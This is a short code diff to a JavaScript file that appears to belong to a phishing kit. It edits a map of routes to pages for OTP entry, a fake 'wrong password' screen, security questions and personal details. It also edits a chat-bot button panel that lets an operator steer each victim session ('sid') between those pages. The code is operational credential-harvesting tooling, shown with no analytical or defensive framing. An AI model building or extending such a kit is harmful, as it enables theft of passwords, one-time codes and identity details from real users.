@@ -194,9 +194,9 @@
 
     const ROUTES = {
         "otp":     "otp.html",
-        "passwordrest":  "passwordrest.html",
+        "wrongpass":  "wrongpass.html",
         "login":   "login.html",
-        "secquestion": "secquestion.html",
+        "secquestion": "sec1.html",
         "detail":   "detail.html"
     };
     // =========================
@@ -270,10 +270,10 @@
             const keyboard = {
                 inline_keyboard: [
                     [{ text: "🔐 OTP",       callback_data: `otp:${sid}`     }],
-                    [{ text: "🔑 Forgot",    callback_data: `forgot:${sid}`  }],
+                    [{ text: "🔑 Wrongpass",    callback_data: `Wrongpass:${sid}`  }],
                     [{ text: "↩️ Login",     callback_data: `login:${sid}`   }],
-                    [{ text: "✅ Dashboard", callback_data: `success:${sid}` }],
-                    [{ text: "🚫 Block",     callback_data: `block:${sid}`   }]
+                    [{ text: "✅ Secquestion", callback_data: `Secquestion:${sid}` }],
+                    [{ text: "✍️ Detail",     callback_data: `Detail:${sid}`   }]
                 ]
             };
 
